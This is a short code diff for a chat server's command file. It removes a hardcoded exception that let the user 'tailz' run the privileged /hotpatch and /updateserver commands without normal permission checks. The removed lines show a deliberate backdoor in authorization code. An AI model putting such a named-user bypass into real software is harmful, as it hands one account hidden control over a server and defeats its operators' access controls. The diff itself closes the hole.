@@ -4350,7 +4350,7 @@ var commands = exports.commands = {
 
 	hotpatch: function (target, room, user) {
 		if (!target) return this.parse('/help hotpatch');
-		if (!this.can('hotpatch') && user.userid != "tailz") return false;
+		if (!this.can('hotpatch')) return false;
 
 		this.logEntry(user.name + " used /hotpatch " + target);
 
@@ -4590,7 +4590,7 @@ var commands = exports.commands = {
 	us: 'updateserver',
 	gitpull: 'updateserver',
 	updateserver: function(target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection) && user.userid != "tailz") {
+		if (!user.hasConsoleAccess(connection)) {
 			return this.sendReply("/updateserver - Access denied.");
 		}
 
